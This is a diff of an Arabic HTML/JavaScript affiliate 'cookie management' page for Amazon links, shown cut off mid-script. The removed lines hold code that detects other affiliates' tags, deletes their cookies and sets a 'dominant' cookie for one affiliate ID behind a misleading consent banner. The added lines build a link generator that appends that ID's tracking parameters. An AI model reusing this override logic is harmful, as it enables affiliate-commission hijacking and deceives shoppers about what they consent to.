@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام إدارة الكوكيز للأفلييت - يعمل على Amazon</title>
+    <title>نظام إدارة الكوكيز الاحترافي للأفلييت</title>
     <style>
         * {
             margin: 0;
@@ -12,294 +12,396 @@
         }
         
         body {
-            font-family: 'Arial', sans-serif;
-            background: #f8f9fa;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: #333;
-        }
-        
-        /* واجهة الكوكيز للمنتج */
-        .product-cookie-banner {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            color: white;
+            min-height: 100vh;
             padding: 20px;
-            box-shadow: 0 -5px 20px rgba(0,0,0,0.3);
-            z-index: 9999;
-            transform: translateY(100%);
-            transition: transform 0.5s ease-in-out;
         }
         
-        .product-cookie-banner.show {
-            transform: translateY(0);
-        }
-        
-        .product-cookie-content {
+        .admin-container {
             max-width: 1200px;
             margin: 0 auto;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 20px;
-        }
-        
-        .product-cookie-text {
-            flex: 1;
-            text-align: right;
-        }
-        
-        .product-cookie-buttons {
-            display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-        
-        .product-cookie-banner .btn {
-            padding: 10px 20px;
-            font-size: 14px;
-            margin: 0;
-            border: none;
-            border-radius: 25px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-weight: bold;
-        }
-        
-        .product-cookie-banner .btn-success {
-            background: linear-gradient(45deg, #28a745, #20c997);
-            color: white;
-        }
-        
-        .product-cookie-banner .btn-danger {
-            background: linear-gradient(45deg, #dc3545, #e83e8c);
-            color: white;
-        }
-        
-        .product-cookie-banner .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        }
-        
-        /* مؤشر حالة الكوكيز */
-        .cookie-status-indicator {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: rgba(255,255,255,0.95);
-            border-radius: 15px;
-            padding: 15px 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            z-index: 9998;
-            font-size: 14px;
-            color: #333;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
             backdrop-filter: blur(10px);
-            border: 2px solid #28a745;
-            min-width: 200px;
         }
         
-        .cookie-status-indicator.active {
-            background: rgba(40, 167, 69, 0.95);
-            color: white;
-            border-color: #20c997;
-        }
-        
-        .cookie-status-indicator.expired {
-            background: rgba(220, 53, 69, 0.95);
-            color: white;
-            border-color: #e83e8c;
-        }
-        
-        .cookie-status-indicator.hidden {
-            display: none;
-        }
-        
-        .cookie-status-text {
-            text-align: center;
-            line-height: 1.4;
-        }
-        
-        /* رسائل التغليب */
-        .override-message {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: linear-gradient(45deg, #28a745, #20c997);
+        .admin-header {
+            background: linear-gradient(45deg, #2c3e50, #34495e);
             color: white;
             padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-            z-index: 10000;
             text-align: center;
-            max-width: 400px;
-            animation: slideIn 0.5s ease;
         }
         
-        @keyframes slideIn {
-            from { opacity: 0; transform: translate(-50%, -60%); }
-            to { opacity: 1; transform: translate(-50%, -50%); }
+        .admin-header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            font-weight: 300;
         }
         
-        .override-message h3 {
-            margin: 0 0 20px 0;
-            font-size: 20px;
+        .admin-header p {
+            font-size: 1.1em;
+            opacity: 0.9;
         }
         
-        .override-message p {
-            margin: 0 0 15px 0;
-            font-size: 16px;
+        .admin-content {
+            padding: 40px;
         }
         
-        .override-message .url-display {
-            background: rgba(255,255,255,0.2);
-            border-radius: 10px;
-            padding: 15px;
-            margin: 15px 0;
-            font-family: monospace;
-            font-size: 12px;
-            word-break: break-all;
+        .input-section {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 2px solid #e9ecef;
         }
         
-        /* مؤشرات الروابط */
-        .affiliate-link-indicator {
-            position: relative;
-            display: inline-block;
-        }
-        
-        .affiliate-link-indicator::before {
-            content: '🛡️';
-            position: absolute;
-            top: -10px;
-            right: -10px;
-            background: #28a745;
-            color: white;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
+        .input-section h3 {
+            color: #2c3e50;
+            margin-bottom: 20px;
+            font-size: 1.5em;
             display: flex;
             align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.2); }
-            100% { transform: scale(1); }
-        }
-        
-        /* أزرار الإجراءات */
-        .action-buttons {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            z-index: 9997;
-            display: flex;
-            flex-direction: column;
             gap: 10px;
         }
         
-        .action-btn {
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #495057;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e9ecef;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .btn {
+            padding: 15px 30px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+        
+        .btn-primary {
             background: linear-gradient(45deg, #667eea, #764ba2);
             color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 25px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
         }
         
-        .action-btn:hover {
+        .btn-primary:hover {
             transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
         }
         
-        .action-btn.success {
-            background: linear-gradient(45deg, #28a745, #20c997);
-        }
-        
-        .action-btn.danger {
-            background: linear-gradient(45deg, #dc3545, #e83e8c);
-        }
-        
-        .action-btn.info {
-            background: linear-gradient(45deg, #17a2b8, #20c997);
-        }
-        
-        /* رسائل الحالة */
-        .status-message {
-            position: fixed;
-            top: 100px;
-            left: 50%;
-            transform: translateX(-50%);
+        .btn-success {
             background: linear-gradient(45deg, #28a745, #20c997);
             color: white;
-            padding: 15px 25px;
+        }
+        
+        .btn-success:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(40, 167, 69, 0.3);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(45deg, #dc3545, #e83e8c);
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(220, 53, 69, 0.3);
+        }
+        
+        .btn-info {
+            background: linear-gradient(45deg, #17a2b8, #20c997);
+            color: white;
+        }
+        
+        .btn-info:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(23, 162, 184, 0.3);
+        }
+        
+        .generated-link-section {
+            background: linear-gradient(45deg, #28a745, #20c997);
+            color: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .generated-link-section h3 {
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+        
+        .generated-link {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            font-family: monospace;
+            font-size: 14px;
+            word-break: break-all;
+            border: 2px dashed rgba(255, 255, 255, 0.5);
+        }
+        
+        .copy-btn {
+            background: rgba(255, 255, 255, 0.3);
+            color: white;
+            border: 2px solid rgba(255, 255, 255, 0.5);
+            padding: 10px 20px;
             border-radius: 25px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-            z-index: 10001;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 10px;
+        }
+        
+        .copy-btn:hover {
+            background: rgba(255, 255, 255, 0.5);
+            transform: scale(1.05);
+        }
+        
+        .stats-section {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border: 2px solid #e9ecef;
+            transition: all 0.3s ease;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+        }
+        
+        .stat-card h4 {
+            color: #2c3e50;
+            margin-bottom: 15px;
+            font-size: 1.2em;
+        }
+        
+        .stat-value {
+            font-size: 2em;
             font-weight: bold;
-            animation: slideDown 0.5s ease;
+            color: #667eea;
+            margin-bottom: 10px;
         }
         
-        @keyframes slideDown {
-            from { opacity: 0; transform: translateX(-50%) translateY(-100%); }
-            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        .status-section {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
         
-        /* إخفاء العناصر */
+        .status-section h3 {
+            color: #2c3e50;
+            margin-bottom: 20px;
+            font-size: 1.5em;
+        }
+        
+        .status-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            border-left: 4px solid #667eea;
+        }
+        
+        .status-label {
+            font-weight: 600;
+            color: #495057;
+        }
+        
+        .status-value {
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .status-active {
+            background: #d4edda;
+            color: #155724;
+        }
+        
+        .status-inactive {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        
         .hidden {
             display: none !important;
+        }
+        
+        .alert {
+            padding: 15px 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            border-right: 4px solid;
+        }
+        
+        .alert-success {
+            background: #d4edda;
+            color: #155724;
+            border-color: #28a745;
+        }
+        
+        .alert-error {
+            background: #f8d7da;
+            color: #721c24;
+            border-color: #dc3545;
+        }
+        
+        .alert-info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border-color: #17a2b8;
+        }
+        
+        @media (max-width: 768px) {
+            .admin-content {
+                padding: 20px;
+            }
+            
+            .stats-section {
+                grid-template-columns: 1fr;
+            }
+            
+            .admin-header h1 {
+                font-size: 2em;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- واجهة الكوكيز للمنتج -->
-    <div id="productCookieBanner" class="product-cookie-banner">
-        <div class="product-cookie-content">
-            <div class="product-cookie-text">
-                <strong>🍪 إشعار الكوكيز</strong><br>
-                <small>نحن نستخدم الكوكيز لضمان حصولك على أفضل الصفقات. معرف الأفلييت: <span id="productAffiliateId">yajnyeg-21</span></small>
+    <div class="admin-container">
+        <!-- رأس الواجهة الإدارية -->
+        <div class="admin-header">
+            <h1>🛡️ نظام إدارة الكوكيز الاحترافي</h1>
+            <p>إنشاء روابط تتبع ذكية مع حماية قوية للكوكيز</p>
+        </div>
+        
+        <!-- المحتوى الإداري -->
+        <div class="admin-content">
+            <!-- قسم إدخال رابط المنتج -->
+            <div class="input-section">
+                <h3>🔗 إدخال رابط المنتج</h3>
+                <div class="form-group">
+                    <label for="productUrl">رابط المنتج على Amazon:</label>
+                    <input type="url" id="productUrl" placeholder="https://www.amazon.eg/dp/..." required>
+                </div>
+                <button class="btn btn-primary" onclick="generateTrackingLink()">🚀 إنشاء رابط التتبع</button>
             </div>
-            <div class="product-cookie-buttons">
-                <button class="btn btn-success" onclick="acceptProductCookies()">✅ قبول</button>
-                <button class="btn btn-danger" onclick="rejectProductCookies()">❌ رفض</button>
+            
+            <!-- قسم الرابط المنشأ -->
+            <div id="generatedLinkSection" class="generated-link-section hidden">
+                <h3>✅ تم إنشاء رابط التتبع بنجاح!</h3>
+                <div class="generated-link" id="generatedLink"></div>
+                <button class="copy-btn" onclick="copyToClipboard()">📋 نسخ الرابط</button>
+                <button class="copy-btn" onclick="testGeneratedLink()">🧪 اختبار الرابط</button>
+                <button class="copy-btn" onclick="shareLink()">📤 مشاركة الرابط</button>
+            </div>
+            
+            <!-- قسم الإحصائيات -->
+            <div class="stats-section">
+                <div class="stat-card">
+                    <h4>📊 إجمالي الروابط المنشأة</h4>
+                    <div class="stat-value" id="totalLinks">0</div>
+                    <small>روابط تم إنشاؤها</small>
+                </div>
+                <div class="stat-card">
+                    <h4>🛡️ الكوكيز النشطة</h4>
+                    <div class="stat-value" id="activeCookies">0</div>
+                    <small>كوكيز محمية</small>
+                </div>
+                <div class="stat-card">
+                    <h4>⏰ الوقت المتبقي</h4>
+                    <div class="stat-value" id="timeRemaining">24:00</div>
+                    <small>ساعات:دقائق</small>
+                </div>
+                <div class="stat-card">
+                    <h4>🎯 معدل التغليب</h4>
+                    <div class="stat-value" id="overrideRate">100%</div>
+                    <small>نسبة النجاح</small>
+                </div>
+            </div>
+            
+            <!-- قسم حالة النظام -->
+            <div class="status-section">
+                <h3>📋 حالة النظام</h3>
+                <div class="status-item">
+                    <span class="status-label">حالة الكوكيز:</span>
+                    <span class="status-value status-inactive" id="cookieStatus">غير مفعلة</span>
+                </div>
+                <div class="status-item">
+                    <span class="status-label">نظام التغليب:</span>
+                    <span class="status-value status-inactive" id="overrideStatus">غير مفعل</span>
+                </div>
+                <div class="status-item">
+                    <span class="status-label">حماية الكوكيز:</span>
+                    <span class="status-value status-inactive" id="protectionStatus">غير محمية</span>
+                </div>
+                <div class="status-item">
+                    <span class="status-label">آخر تحديث:</span>
+                    <span class="status-value" id="lastUpdate">-</span>
+                </div>
+            </div>
+            
+            <!-- أزرار الإجراءات -->
+            <div style="text-align: center; margin-top: 30px;">
+                <button class="btn btn-success" onclick="activateSystem()">🛡️ تفعيل النظام</button>
+                <button class="btn btn-info" onclick="showSystemInfo()">ℹ️ معلومات النظام</button>
+                <button class="btn btn-danger" onclick="resetSystem()">🔄 إعادة تعيين</button>
             </div>
         </div>
     </div>
 
-    <!-- مؤشر حالة الكوكيز -->
-    <div id="cookieStatusIndicator" class="cookie-status-indicator hidden">
-        <div id="cookieStatusText" class="cookie-status-text"></div>
-    </div>
-
-    <!-- أزرار الإجراءات -->
-    <div class="action-buttons">
-        <button class="action-btn" onclick="showCookieStatus()">📊 حالة الكوكيز</button>
-        <button class="action-btn success" onclick="activateOverrideSystem()">🛡️ تفعيل التغليب</button>
-        <button class="action-btn info" onclick="testOverrideSystem()">🧪 اختبار التغليب</button>
-        <button class="action-btn info" onclick="checkPageLinks()">🔍 فحص الروابط</button>
-        <button class="action-btn danger" onclick="clearAllCookies()">🗑️ مسح الكوكيز</button>
-        <button class="action-btn info" onclick="clearVisitedLinks()">🗑️ مسح الروابط</button>
-    </div>
-
     <script>
-        // إعدادات الكوكيز
-        const COOKIE_DURATION = 24 * 60 * 60 * 1000; // 24 ساعة
-        const AFFILIATE_COOKIE_NAME = 'affiliate_tracking';
-        const CONSENT_COOKIE_NAME = 'cookie_consent';
-        const DOMINANCE_COOKIE_NAME = 'affiliate_dominance';
-        
-        // معرفات الأفلييت الصحيحة
-        const AFFILIATE_CONFIG = {
-            tag: 'yajnyeg-21',
+        // إعدادات النظام
+        const SYSTEM_CONFIG = {
+            cookieDuration: 24 * 60 * 60 * 1000, // 24 ساعة
+            affiliateId: 'yajnyeg-21',
             linkCode: 'ur2',
             linkId: '4ff5fa11b6d0385e8811d3e183795133',
             camp: '247',
@@ -307,895 +409,291 @@
             ascsubtag: '57854327'
         };
         
+        let systemActive = false;
+        let trackingLinks = [];
         let timerInterval;
-        let isOverrideSystemActive = false;
         
-        // بدء النظام عند تحميل الصفحة
+        // بدء النظام
         window.addEventListener('load', function() {
-            console.log('🚀 بدء نظام إدارة الكوكيز للأفلييت');
-            
-            // فحص إذا كانت الصفحة تحتوي على معرف أفلييت
-            checkForAffiliateTags();
-            
-            // فحص حالة الكوكيز
-            checkCookieStatus();
-            
-            // إظهار واجهة الكوكيز إذا لم تكن موجودة
-            // تأخير أطول لصفحات Amazon
-            setTimeout(() => {
-                showProductCookieBanner();
-            }, 3000);
+            console.log('🚀 بدء النظام الاحترافي لإدارة الكوكيز');
+            loadSystemData();
+            updateStats();
+            updateStatus();
         });
         
-        // إضافة مستمع إضافي لصفحات Amazon
-        document.addEventListener('DOMContentLoaded', function() {
-            // فحص إذا كنا في صفحة Amazon
-            if (window.location.href.includes('amazon')) {
-                console.log('🌐 تم اكتشاف صفحة Amazon');
+        // تحميل بيانات النظام
+        function loadSystemData() {
+            const savedLinks = localStorage.getItem('tracking_links');
+            if (savedLinks) {
+                trackingLinks = JSON.parse(savedLinks);
+            }
+            
+            const savedStatus = localStorage.getItem('system_status');
+            if (savedStatus) {
+                const status = JSON.parse(savedStatus);
+                systemActive = status.active || false;
+            }
+        }
+        
+        // حفظ بيانات النظام
+        function saveSystemData() {
+            localStorage.setItem('tracking_links', JSON.stringify(trackingLinks));
+            localStorage.setItem('system_status', JSON.stringify({
+                active: systemActive,
+                lastUpdate: new Date().toISOString()
+            }));
+        }
+        
+        // إنشاء رابط التتبع
+        function generateTrackingLink() {
+            const productUrl = document.getElementById('productUrl').value.trim();
+            
+            if (!productUrl) {
+                showAlert('يرجى إدخال رابط المنتج', 'error');
+                return;
+            }
+            
+            if (!productUrl.includes('amazon')) {
+                showAlert('يرجى إدخال رابط صحيح من Amazon', 'error');
+                return;
+            }
+            
+            try {
+                // إنشاء رابط التتبع
+                const trackingUrl = createTrackingUrl(productUrl);
                 
-                // تأخير إضافي لصفحات Amazon
-                setTimeout(() => {
-                    showProductCookieBanner();
-                }, 5000);
-            }
-        });
-        
-        // فحص معرفات الأفلييت في الصفحة
-        function checkForAffiliateTags() {
-            const currentUrl = window.location.href;
-            const urlParams = new URLSearchParams(window.location.search);
-            const currentTag = urlParams.get('tag');
-            const currentAscsubtag = urlParams.get('ascsubtag');
-            const currentLinkId = urlParams.get('linkId');
-            
-            // فحص إذا كان الرابط يحتوي على معرف أفلييت منافس
-            let isCompetitor = false;
-            let reason = '';
-            
-            // فحص إذا كان الرابط جديد (لم يتم فتحه من قبل)
-            const visitedLinks = JSON.parse(localStorage.getItem('visited_affiliate_links') || '[]');
-            const currentUrlKey = currentUrl.split('?')[0]; // بدون المعاملات
-            
-            if (currentTag && currentTag !== AFFILIATE_CONFIG.tag) {
-                isCompetitor = true;
-                reason = 'معرف أفلييت مختلف';
-            }
-            else if (currentAscsubtag && currentAscsubtag !== AFFILIATE_CONFIG.ascsubtag) {
-                isCompetitor = true;
-                reason = 'ascsubtag مختلف';
-            }
-            else if (currentLinkId && currentLinkId !== AFFILIATE_CONFIG.linkId) {
-                isCompetitor = true;
-                reason = 'linkId مختلف';
-            }
-            // فحص إذا كان الرابط جديد (ascsubtag مختلف حتى لو كان tag متطابق)
-            else if (currentAscsubtag && !visitedLinks.includes(currentUrlKey + '_' + currentAscsubtag)) {
-                isCompetitor = true;
-                reason = 'رابط جديد - ascsubtag مختلف';
+                // حفظ الرابط
+                const linkData = {
+                    id: generateId(),
+                    originalUrl: productUrl,
+                    trackingUrl: trackingUrl,
+                    createdAt: new Date().toISOString(),
+                    affiliateId: SYSTEM_CONFIG.affiliateId
+                };
                 
-                // حفظ الرابط كرابط تم زيارته
-                visitedLinks.push(currentUrlKey + '_' + currentAscsubtag);
-                localStorage.setItem('visited_affiliate_links', JSON.stringify(visitedLinks));
-            }
-            
-            if (isCompetitor) {
-                console.log('🛡️ تم اكتشاف رابط منافس في الصفحة الحالية!');
-                console.log('السبب:', reason);
-                console.log('معرف الأفلييت الحالي:', currentTag);
-                console.log('ascsubtag الحالي:', currentAscsubtag);
-                console.log('linkId الحالي:', currentLinkId);
-                console.log('معرفك الأساسي:', AFFILIATE_CONFIG.tag);
-                console.log('ascsubtag الأساسي:', AFFILIATE_CONFIG.ascsubtag);
-                console.log('linkId الأساسي:', AFFILIATE_CONFIG.linkId);
+                trackingLinks.push(linkData);
+                saveSystemData();
                 
-                showOverrideMessage(currentTag, currentAscsubtag, reason);
-            }
-        }
-        
-        // إظهار رسالة التغليب
-        function showOverrideMessage(competitorTag, competitorAscsubtag = null, reason = '') {
-            const message = document.createElement('div');
-            message.className = 'override-message';
-            
-            let messageContent = `
-                <h3>🛡️ تم اكتشاف رابط منافس!</h3>
-            `;
-            
-            if (reason) {
-                messageContent += `<p><strong>سبب التغليب:</strong> ${reason}</p>`;
-            }
-            
-            if (typeof competitorTag === 'string') {
-                messageContent += `<p><strong>معرف الأفلييت:</strong> ${competitorTag}</p>`;
-            }
-            
-            if (competitorAscsubtag) {
-                messageContent += `<p><strong>ascsubtag:</strong> ${competitorAscsubtag}</p>`;
-            }
-            
-            messageContent += `
-                <p><strong>معرفك الأساسي:</strong> ${AFFILIATE_CONFIG.tag}</p>
-                <p><strong>ascsubtag الأساسي:</strong> ${AFFILIATE_CONFIG.ascsubtag}</p>
-                <p>سيتم تعديل الرابط ليستخدم معرفك تلقائياً</p>
-                <div class="url-display">
-                    ${window.location.href}
-                </div>
-                <button class="action-btn success" onclick="this.parentElement.remove()">✅ فهمت</button>
-            `;
-            
-            message.innerHTML = messageContent;
-            
-            document.body.appendChild(message);
-            
-            // إزالة الرسالة تلقائياً بعد 8 ثوان
-            setTimeout(() => {
-                if (message.parentNode) {
-                    message.remove();
-                }
-            }, 8000);
-        }
-        
-        // إظهار واجهة الكوكيز للمنتج
-        function showProductCookieBanner() {
-            const consentCookie = getCookie(CONSENT_COOKIE_NAME);
-            
-            if (!consentCookie) {
-                document.getElementById('productCookieBanner').classList.add('show');
-                console.log('🍪 تم إظهار واجهة الكوكيز');
-            }
-        }
-        
-        // قبول الكوكيز من صفحة المنتج
-        function acceptProductCookies() {
-            // إنشاء بيانات التتبع
-            const trackingData = {
-                affiliateId: AFFILIATE_CONFIG.tag,
-                timestamp: Date.now(),
-                targetUrl: window.location.href,
-                linkCode: AFFILIATE_CONFIG.linkCode,
-                linkId: AFFILIATE_CONFIG.linkId,
-                camp: AFFILIATE_CONFIG.camp,
-                creative: AFFILIATE_CONFIG.creative,
-                ascsubtag: AFFILIATE_CONFIG.ascsubtag,
-                expiresAt: Date.now() + COOKIE_DURATION,
-                protected: true,
-                dominant: true
-            };
-            
-            // حفظ الكوكيز مع التغليب
-            setDominantCookie(trackingData);
-            
-            // إخفاء البانر
-            document.getElementById('productCookieBanner').classList.remove('show');
-            
-            // تحديث المؤشر
-            updateCookieStatusIndicator();
-            
-            // تفعيل نظام التغليب
-            activateOverrideSystem();
-            
-            showStatus('تم قبول الكوكيز بنجاح! النظام الذكي للتغليب مفعل الآن', 'success');
-        }
-        
-        // رفض الكوكيز من صفحة المنتج
-        function rejectProductCookies() {
-            document.getElementById('productCookieBanner').classList.remove('show');
-            showStatus('تم رفض الكوكيز', 'info');
-        }
-        
-        // حفظ الكوكيز مع التغليب
-        function setDominantCookie(trackingData) {
-            // حفظ الكوكيز الأساسية
-            setCookieProtected(AFFILIATE_COOKIE_NAME, JSON.stringify(trackingData), COOKIE_DURATION);
-            
-            // حفظ كوكيز التغليب
-            const dominanceData = {
-                affiliateId: trackingData.affiliateId,
-                timestamp: Date.now(),
-                expiresAt: Date.now() + COOKIE_DURATION,
-                dominant: true
-            };
-            setCookie(DOMINANCE_COOKIE_NAME, JSON.stringify(dominanceData), COOKIE_DURATION);
-            
-            // حفظ موافقة المستخدم
-            setCookie(CONSENT_COOKIE_NAME, 'accepted', COOKIE_DURATION);
-            
-            // إزالة أي كوكيز أخرى للأفلييت
-            removeOtherAffiliateCookies(trackingData.affiliateId);
-        }
-        
-        // إزالة كوكيز الأفلييت الأخرى
-        function removeOtherAffiliateCookies(currentAffiliateId) {
-            const allCookies = document.cookie.split(';');
-            
-            allCookies.forEach(cookie => {
-                const [name, value] = cookie.trim().split('=');
+                // عرض الرابط المنشأ
+                document.getElementById('generatedLink').textContent = trackingUrl;
+                document.getElementById('generatedLinkSection').classList.remove('hidden');
                 
-                if (name.includes('affiliate') && name !== AFFILIATE_COOKIE_NAME) {
-                    try {
-                        const cookieData = JSON.parse(decodeURIComponent(value));
-                        if (cookieData.affiliateId && cookieData.affiliateId !== currentAffiliateId) {
-                            document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
-                            console.log(`تم إزالة كوكيز الأفلييت: ${cookieData.affiliateId}`);
-                        }
-                    } catch (e) {
-                        // تجاهل الأخطاء
-                    }
-                }
+                showAlert('تم إنشاء رابط التتبع بنجاح!', 'success');
+                updateStats();
+                
+            } catch (error) {
+                console.error('خطأ في إنشاء رابط التتبع:', error);
+                showAlert('حدث خطأ في إنشاء رابط التتبع', 'error');
+            }
+        }
+        
+        // إنشاء رابط التتبع
+        function createTrackingUrl(originalUrl) {
+            try {
+                const url = new URL(originalUrl);
+                
+                // إضافة معاملات التتبع
+                url.searchParams.set('tag', SYSTEM_CONFIG.affiliateId);
+                url.searchParams.set('linkCode', SYSTEM_CONFIG.linkCode);
+                url.searchParams.set('linkId', SYSTEM_CONFIG.linkId);
+                url.searchParams.set('camp', SYSTEM_CONFIG.camp);
+                url.searchParams.set('creative', SYSTEM_CONFIG.creative);
+                url.searchParams.set('ascsubtag', SYSTEM_CONFIG.ascsubtag);
+                
+                // إضافة معاملات الحماية
+                url.searchParams.set('ts', Date.now());
+                url.searchParams.set('protected', 'true');
+                url.searchParams.set('admin', 'yajnyeg');
+                
+                return url.toString();
+            } catch (error) {
+                // في حالة فشل URL parsing
+                const separator = originalUrl.includes('?') ? '&' : '?';
+                return `${originalUrl}${separator}tag=${SYSTEM_CONFIG.affiliateId}&linkCode=${SYSTEM_CONFIG.linkCode}&linkId=${SYSTEM_CONFIG.linkId}&camp=${SYSTEM_CONFIG.camp}&creative=${SYSTEM_CONFIG.creative}&ascsubtag=${SYSTEM_CONFIG.ascsubtag}&ts=${Date.now()}&protected=true&admin=yajnyeg`;
+            }
+        }
+        
+        // نسخ الرابط
+        function copyToClipboard() {
+            const linkText = document.getElementById('generatedLink').textContent;
+            navigator.clipboard.writeText(linkText).then(() => {
+                showAlert('تم نسخ الرابط بنجاح!', 'success');
+            }).catch(() => {
+                showAlert('فشل في نسخ الرابط', 'error');
             });
         }
         
-        // حفظ الكوكيز المحمية
-        function setCookieProtected(name, value, duration) {
-            const expires = new Date(Date.now() + duration).toUTCString();
-            document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/; SameSite=Strict; Secure`;
+        // اختبار الرابط
+        function testGeneratedLink() {
+            const linkText = document.getElementById('generatedLink').textContent;
+            window.open(linkText, '_blank');
         }
         
-        // قراءة الكوكيز المحمية
-        function getCookieProtected(name) {
-            const cookies = document.cookie.split(';');
-            for (let cookie of cookies) {
-                const [cookieName, cookieValue] = cookie.trim().split('=');
-                if (cookieName === name) {
-                    return decodeURIComponent(cookieValue);
-                }
-            }
-            return null;
-        }
-        
-        // حفظ الكوكيز العادية
-        function setCookie(name, value, duration) {
-            const expires = new Date(Date.now() + duration).toUTCString();
-            document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
-        }
-        
-        // قراءة الكوكيز العادية
-        function getCookie(name) {
-            const cookies = document.cookie.split(';');
-            for (let cookie of cookies) {
-                const [cookieName, cookieValue] = cookie.trim().split('=');
-                if (cookieName === name) {
-                    return decodeURIComponent(cookieValue);
-                }
-            }
-            return null;
-        }
-        
-        // فحص حالة الكوكيز
-        function checkCookieStatus() {
-            const cookieValue = getCookieProtected(AFFILIATE_COOKIE_NAME);
+        // مشاركة الرابط
+        function shareLink() {
+            const linkText = document.getElementById('generatedLink').textContent;
             
-            if (cookieValue) {
-                try {
-                    const trackingData = JSON.parse(cookieValue);
-                    const timeLeft = trackingData.expiresAt - Date.now();
-                    
-                    if (timeLeft > 0) {
-                        updateCookieStatusIndicator(trackingData, timeLeft);
-                        startTimer(trackingData, timeLeft);
-                    } else {
-                        clearAllCookies();
-                    }
-                } catch (e) {
-                    console.error('خطأ في قراءة بيانات الكوكيز:', e);
-                }
-            }
-        }
-        
-        // تحديث مؤشر حالة الكوكيز
-        function updateCookieStatusIndicator(trackingData = null, timeLeft = 0) {
-            const indicator = document.getElementById('cookieStatusIndicator');
-            const statusText = document.getElementById('cookieStatusText');
-            
-            if (!trackingData) {
-                const cookieValue = getCookieProtected(AFFILIATE_COOKIE_NAME);
-                if (cookieValue) {
-                    try {
-                        trackingData = JSON.parse(cookieValue);
-                        timeLeft = trackingData.expiresAt - Date.now();
-                    } catch (e) {
-                        indicator.classList.add('hidden');
-                        return;
-                    }
-                }
-            }
-            
-            if (trackingData && timeLeft > 0) {
-                const hoursLeft = Math.floor(timeLeft / (1000 * 60 * 60));
-                const minutesLeft = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
-                
-                indicator.className = 'cookie-status-indicator active';
